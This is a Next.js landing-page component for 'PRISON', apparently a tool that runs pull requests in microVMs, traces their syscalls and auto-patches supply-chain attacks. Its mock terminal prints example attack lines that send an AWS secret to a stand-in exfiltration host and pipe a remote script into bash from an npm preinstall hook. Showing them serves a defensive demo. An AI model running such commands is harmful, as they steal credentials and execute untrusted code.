'use client';
import Link from 'next/link';
import Navbar from '@/components/Navbar';
import ToastContainer from '@/components/Toast';

const TICKER_ITEMS = ['Zero-Trust CI/CD', 'eBPF Kernel Probes', 'MicroVM Isolation', 'AI Remediation', 'Supply Chain Security', 'Honeypot Trapping', 'ANAKIN Agent', 'OSEN Telemetry', 'MANTITUP Sandbox'];

const FEATURES = [
  { icon: '🛡️', name: 'MANTITUP', track: 'MicroVM Engine', color: 'cyan', desc: 'Ephemeral Firecracker microVM provisioning under 150ms. Full network isolation with honeypot environment variable seeding. Hardware KVM-level containment.' },
  { icon: '👁️', name: 'OSEN',     track: 'eBPF Kernel Probes', color: 'amber', desc: 'Low-level kernel observation via BPF tracepoints on execve, connect, and openat syscalls. Real-time ring buffer streaming with zero host-side overhead.' },
  { icon: '📊', name: 'TRACECOMMON', track: 'Telemetry Pipeline', color: 'green', desc: 'Normalization, risk classification, and Directed Acyclic Graph (DAG) construction from raw kernel events. Color-tiered node threat scoring.' },
  { icon: '🤖', name: 'ANAKIN',   track: 'AI Remediation Agent', color: 'red', desc: 'LLM-backed triage engine with Rule R08 confidence gating. Generates unified diff patches and pushes them directly to the developer\'s branch on GitHub.' },
];

const HOW_IT_WORKS = [
  { step: '01', title: 'PR Opened', desc: 'Developer opens a pull request modifying package.json or adding a build script.', icon: '⬆️', color: 'cyan' },
  { step: '02', title: 'Webhook Intercept', desc: 'PRISON intercepts the GitHub webhook payload, verifies HMAC-SHA256 signature, and queues the job.', icon: '⚡', color: 'amber' },
  { step: '03', title: 'MicroVM Detonation', desc: 'Untrusted code executes inside an ephemeral Firecracker microVM with injected honeypot credentials.', icon: '💥', color: 'amber' },
  { step: '04', title: 'eBPF Observation', desc: 'OSEN probes trace every syscall — process spawns, file reads, and socket connections — in real time.', icon: '🔍', color: 'red' },
  { step: '05', title: 'Honeypot Trip', desc: 'Malicious script reads $AWS_SECRET_ACCESS_KEY. Execution is halted immediately. Evidence captured.', icon: '🪤', color: 'red' },
  { step: '06', title: 'AI Remediation', desc: 'ANAKIN analyzes the attack graph, comments on the PR with findings, and commits an automated fix patch.', icon: '🤖', color: 'green' },
];

const STATS = [
  { val: '<150ms', lbl: 'MicroVM Boot Time' },
  { val: '<10s',   lbl: 'Total Pipeline Overhead' },
  { val: '100%',   lbl: 'KVM Hardware Isolation' },
  { val: '0',      lbl: 'Shared Kernel State' },
];

export default function LandingPage() {
  return (
    <>
      <Navbar />
      <ToastContainer />

      {/* ── Ticker ───────────────────────────── */}
      <div className="ticker-wrapper">
        <div className="ticker-inner">
          {[...TICKER_ITEMS, ...TICKER_ITEMS].map((item, i) => (
            <span key={i} className="ticker-item">
              <span>◆</span> {item}
            </span>
          ))}
        </div>
      </div>

      {/* ── Hero ─────────────────────────────── */}
      <section className="hero">
        <div className="container">
          <div className="hero-grid">
            {/* Left: Copy */}
            <div className="fade-in-up">
              <div className="hero-eyebrow">
                <span className="badge badge-red">
                  <span className="pulse-dot red" /> Supply Chain Attacks
                </span>
                <span className="badge badge-cyan">New Defense</span>
              </div>

              <h1 className="hero-h1">
                STOP ZERO-DAY<br />
                <span>SUPPLY CHAIN</span><br />
                ATTACKS.
              </h1>

              <p className="hero-desc">
                PRISON detonates every Pull Request inside an isolated microVM,
                traces malicious syscalls with eBPF kernel probes, traps credential
                theft via honeypots, and auto-generates fix patches using the ANAKIN AI agent.
              </p>

              <div className="hero-actions">
                <Link href="/sandbox" id="hero-cta-detonate" className="btn btn-primary btn-lg">
                  ⚡ Detonate a PR →
                </Link>
                <Link href="/registry" id="hero-cta-registry" className="btn btn-ghost btn-lg">
                  View Threat Registry →
                </Link>
              </div>

              <div className="hero-stats">
                {STATS.map((s) => (
                  <div key={s.lbl}>
                    <div className="hero-stat-val">{s.val}</div>
                    <div className="hero-stat-lbl">{s.lbl}</div>
                  </div>
                ))}
              </div>
            </div>

            {/* Right: Live terminal preview */}
            <div className="fade-in-up" style={{ animationDelay: '0.15s' }}>
              <div className="terminal" style={{ height: '420px' }}>
                <div className="terminal-header">
                  <div className="terminal-dot red" />
                  <div className="terminal-dot amber" />
                  <div className="terminal-dot green" />
                  <span className="terminal-title">PRISON Live Terminal — PR #42 test/repo</span>
                </div>
                <div className="terminal-body" style={{ height: '380px', overflowY: 'auto' }}>
                  {[
                    { c: 'term-agent',   t: '[MANTITUP] Provisioning Firecracker microVM…' },
                    { c: 'term-success', t: '[MANTITUP] MicroVM booted in 112ms ✓ Honeypot keys injected' },
                    { c: 'term-running', t: '[OSEN eBPF] Probes attached → execve | connect | openat' },
                    { c: 'term-line',    t: '[OSEN eBPF] PID 2041  npm install → /usr/bin/npm' },
                    { c: 'term-breach',  t: '[BREACH] PID 4102  /bin/bash -c "curl http://malicious-exfil.com?key=$AWS_SECRET_KEY"' },
                    { c: 'term-line',    t: '[OSEN eBPF] PID 2042  node openat → .env.honeypot (O_RDONLY)' },
                    { c: 'term-breach',  t: '[BREACH] PID 4103  curl → 104.21.44.11:80 UNAUTHORIZED SOCKET' },
                    { c: 'term-breach',  t: '[HONEYPOT] PID 2042  AWS_ACCESS_KEY_ID decoy read! HALTING.' },
                    { c: 'term-success', t: '[TRACECOMMON] 5 events captured. DAG built. Handoff complete.' },
                    { c: 'term-agent',   t: '[ANAKIN] Threat Detected: TRUE | Severity: 95 | Confidence: 98%' },
                    { c: 'term-agent',   t: '[ANAKIN] Gating: BLOCK_PR | Generating patch…' },
                    { c: 'term-diff-add',t: '+  "preinstall": "echo \'PRISON: disabled\'"' },
                    { c: 'term-diff-rem',t: '-  "preinstall": "curl http://malicious-exfil.com | bash"' },
                    { c: 'term-success', t: '[ANAKIN] Patch committed → prison/fix-security-a1b2c3d4 ✓' },
                  ].map((line, i) => (
                    <div key={i} className={line.c} style={{ fontFamily: 'var(--font-mono)', fontSize: '0.72rem', marginBottom: '2px' }}>
                      {line.t}
                    </div>
                  ))}
                  <div style={{ display: 'flex', gap: '0.25rem', marginTop: '0.5rem' }}>
                    <span className="term-prompt" style={{ fontFamily: 'var(--font-mono)', fontSize: '0.72rem' }}>prison@kernel:~$</span>
                    <span className="cursor-blink" style={{ fontFamily: 'var(--font-mono)', fontSize: '0.72rem', color: 'var(--cyan)' }}>█</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ── Bento: Live Metrics ────────────────── */}
      <section className="section-sm" style={{ borderTop: '1px solid var(--border)' }}>
        <div className="container">
          <div className="bento-grid">
            {[
              { label: 'PRs Scanned Today', val: '247', delta: '+12%', color: 'var(--cyan)', up: true },
              { label: 'Threats Blocked',   val: '3',   delta: 'CRITICAL', color: 'var(--red)', up: false },
              { label: 'Patches Committed', val: '3',   delta: 'Auto-Merged', color: 'var(--green)', up: true },
              { label: 'Avg Boot Time',     val: '118ms', delta: 'Under SLA', color: 'var(--amber)', up: true },
            ].map((m) => (
              <div key={m.label} className="bento-4 glass-card metric-card" style={{ padding: '1.5rem' }}>
                <div className="metric-label">{m.label}</div>
                <div className="metric-val" style={{ color: m.color }}>{m.val}</div>
                <div className={`metric-delta ${m.up ? 'up' : 'down'}`}>
                  {m.up ? '↑' : '↓'} {m.delta}
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ── Features: 4 Tracks ────────────────── */}
      <section className="section" id="features">
        <div className="container">
          <div className="section-label">Technical Architecture</div>
          <h2 className="section-title">Powered by Four Agentic Tracks</h2>
          <p className="section-sub">Each track is an autonomous module that communicates through a normalized telemetry schema. Zero shared state between components.</p>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '1rem' }}>
            {FEATURES.map((f) => (
              <div key={f.name} className={`glass-card glass-card-${f.color} feature-card`}>
                <div className={`feature-icon feature-icon-${f.color}`}>{f.icon}</div>
                <div>
                  <div className="feature-name">{f.name}</div>
                  <div className="feature-track">// {f.track}</div>
                </div>
                <p className="feature-desc">{f.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ── How It Works ──────────────────────── */}
      <section className="section" id="how-it-works" style={{ borderTop: '1px solid var(--border)' }}>
        <div className="container">
          <div className="section-label">User Journey</div>
          <h2 className="section-title">Zero-Trust PR Execution in 6 Steps</h2>
          <p className="section-sub">From PR open to remediation, the entire pipeline runs in under 15 seconds without blocking your CI/CD pipeline.</p>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))', gap: '1rem' }}>
            {HOW_IT_WORKS.map((step) => {
              const colors = { cyan: 'var(--cyan)', amber: 'var(--amber)', red: 'var(--red)', green: 'var(--green)' };
              const c = colors[step.color];
              return (
                <div key={step.step} className="glass-card" style={{ padding: '1.5rem', position: 'relative', overflow: 'hidden' }}>
                  <div style={{ position: 'absolute', top: '1rem', right: '1rem', fontFamily: 'var(--font-display)', fontSize: '2.5rem', fontWeight: 900, color: c, opacity: 0.12, lineHeight: 1 }}>{step.step}</div>
                  <div style={{ fontSize: '1.5rem', marginBottom: '0.75rem' }}>{step.icon}</div>
                  <div style={{ fontFamily: 'var(--font-display)', fontSize: '0.8rem', fontWeight: 700, letterSpacing: '0.08em', textTransform: 'uppercase', color: c, marginBottom: '0.5rem' }}>
                    {step.step}. {step.title}
                  </div>
                  <p style={{ fontSize: '0.875rem', color: 'var(--text-secondary)', lineHeight: 1.6 }}>{step.desc}</p>
                </div>
              );
            })}
          </div>
        </div>
      </section>

      {/* ── CTA Banner ────────────────────────── */}
      <section className="section-sm" style={{ borderTop: '1px solid var(--border)', borderBottom: '1px solid var(--border)' }}>
        <div className="container" style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '2rem', flexWrap: 'wrap' }}>
          <div>
            <h2 style={{ fontFamily: 'var(--font-display)', fontSize: 'clamp(1.5rem, 3vw, 2rem)', fontWeight: 900, textTransform: 'uppercase', letterSpacing: '0.04em' }}>
              SECURE YOUR SUPPLY CHAIN <span style={{ color: 'var(--cyan)' }}>TODAY.</span>
            </h2>
            <p style={{ color: 'var(--text-secondary)', marginTop: '0.5rem' }}>Paste a GitHub PR URL and watch PRISON detonate it in a live sandbox in seconds.</p>
          </div>
          <div style={{ display: 'flex', gap: '1rem' }}>
            <Link href="/sandbox" id="cta-banner-detonate" className="btn btn-primary btn-lg">⚡ Open Sandbox →</Link>
            <Link href="/registry" id="cta-banner-registry" className="btn btn-ghost btn-lg">Threat Registry →</Link>
          </div>
        </div>
      </section>

      {/* ── Footer ────────────────────────────── */}
      <footer className="footer">
        <div className="container">
          <div className="footer-grid">
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', marginBottom: '1rem' }}>
                <div className="navbar-logo-icon">PR</div>
                <div>
                  <div style={{ fontFamily: 'var(--font-display)', fontSize: '0.9rem', fontWeight: 900, letterSpacing: '0.12em', textTransform: 'uppercase' }}>PRISON</div>
                  <div style={{ fontFamily: 'var(--font-mono)', fontSize: '0.6rem', color: 'var(--text-muted)', textTransform: 'uppercase' }}>Pull Request Isolation & Security Observation Network</div>
                </div>
              </div>
              <p style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', lineHeight: 1.7, maxWidth: '280px' }}>
                Autonomous AI-powered supply chain attack detection and remediation for modern DevSecOps teams.
              </p>
            </div>
            <div>
              <div className="footer-col-title">Product</div>
              <div className="footer-links">
                <Link href="/sandbox" className="footer-link">Sandbox</Link>
                <Link href="/registry" className="footer-link">Threat Registry</Link>
                <Link href="/" className="footer-link">Overview</Link>
              </div>
            </div>
            <div>
              <div className="footer-col-title">Architecture</div>
              <div className="footer-links">
                {['MANTITUP', 'OSEN', 'TRACECOMMON', 'ANAKIN'].map((t) => (
                  <span key={t} className="footer-link" style={{ fontFamily: 'var(--font-mono)', fontSize: '0.8rem', cursor: 'default' }}>{t}</span>
                ))}
              </div>
            </div>
            <div>
              <div className="footer-col-title">Links</div>
              <div className="footer-links">
                <a href="https://github.com/sudikshaah/PRISON" className="footer-link" target="_blank" rel="noreferrer">GitHub Repo</a>
                <Link href="/docs" className="footer-link">Documentation</Link>
              </div>
            </div>
          </div>
          <div className="footer-bottom">
            <span>© 2026 PRISON — Pull Request Isolation & Security Observation Network</span>
            <span style={{ fontFamily: 'var(--font-mono)', fontSize: '0.7rem', color: 'var(--text-muted)' }}>v1.0.0 — All systems operational</span>
          </div>
        </div>
      </footer>
    </>
  );
}
